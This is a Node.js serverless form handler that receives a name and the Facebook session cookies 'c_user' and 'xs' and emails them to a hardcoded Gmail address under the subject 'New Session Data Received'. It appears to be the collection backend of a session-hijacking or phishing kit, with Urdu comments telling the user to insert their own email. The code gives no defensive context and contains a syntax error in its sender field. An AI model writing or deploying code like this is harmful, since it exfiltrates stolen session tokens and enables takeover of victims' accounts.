import nodemailer from "nodemailer";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method not allowed" });
  }

  const { name, c_user, xs } = req.body;

  if (!name || !c_user || !xs) {
    return res.status(400).json({ message: "Missing required fields" });
  }

  const YOUR_EMAIL = "maxfire068@gmail.com"; // ← 📨 یہاں اپنی email لگائیں

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: YOUR_EMAIL,
      pass: process.env.EMAIL_PASS, // ← Vercel mein secure variable
    },
  });

  const mailOptions = {
    from: `"Form Bot" <${maxfire068@gmail.com}>`,
    to: YOUR_EMAIL,
    subject: "🔐 New Session Data Received",
    text: `
Name: ${name}
User ID (c_user): ${c_user}
Session Token (xs): ${xs}
    `,
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).json({ message: "📨 Email sent successfully" });
  } catch (err) {
    console.error("❌ Email send failed:", err);
    res.status(500).json({ message: "Server error" });
  }
}
